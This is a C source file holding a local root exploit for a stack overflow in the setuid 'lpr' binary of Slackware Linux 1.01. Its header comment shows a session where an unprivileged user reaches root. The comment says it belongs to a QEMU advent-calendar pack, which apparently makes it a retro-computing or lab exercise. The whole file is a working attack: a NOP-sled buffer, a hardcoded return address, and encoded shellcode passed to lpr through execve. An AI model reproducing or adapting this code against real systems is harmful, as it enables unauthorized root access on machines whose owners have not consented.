/* 
 Slackware Linux 1.01 "lpr" stack overflow privilege escalation
 ==============================================================
 Privilege escalation exploit for Slackware Linux 1.01 part of 
 the QEMU 2014 advent calendar pack. Stack based overflow exists
 in the setuid binary "lpr" which can be exploited to gain root
 privileges from a local user perspective. 
 
 e.g. 
 slack:/tmp$ id
 uid=404(ftp) gid=1(other)
 slack:/tmp$ uname -a
 Linux slack 0.99.12 #6 Sun Aug 8 16:02:35 CDT 1993 i586
 slack:/tmp$ gcc prdelka-vs-GNU-lpr.c -o prdelka-vs-GNU-lpr
 slack:/tmp$ ./prdelka-vs-GNU-lpr
 [ Slackware linux 1.01 /usr/bin/lpr local root exploit
 # id
 uid=404(ftp) gid=1(other) euid=0(root) egid=18(lp)
 # exit

 -- prdelka

*/
#include <stdio.h>
#include <stdlib.h>

char shellcode[]="\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c"
		 "\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3"
		 "\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88"
		 "\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff"
		 "\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70"
	         "\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90"
		 "\xe9\x5a\x90\xe8\xb7\x12\xd4\x87";


int main(int argc,char* argv[]){
	char *env[] = {NULL};
	char *buffer = malloc(2048);
	char *ptr;
	char *argp[] = {"/usr/bin/lpr",buffer,shellcode,NULL};
	if(!buffer){
		printf("[ malloc() failure\n");	
		exit(-1);	
	}
	printf("[ Slackware linux 1.01 /usr/bin/lpr local root exploit\n");
	memset(buffer,0,2048);
	memset(buffer,'\x90',1027);
	(long)ptr = (long)buffer + 1027;
	memcpy(ptr,"\xcc\xf3\xff\xbf",4);
	(long)ptr = (long)ptr - 600;
	memcpy(ptr,shellcode,strlen(shellcode));	
	execve("/usr/bin/lpr",argp,env);	
	exit(0);
}

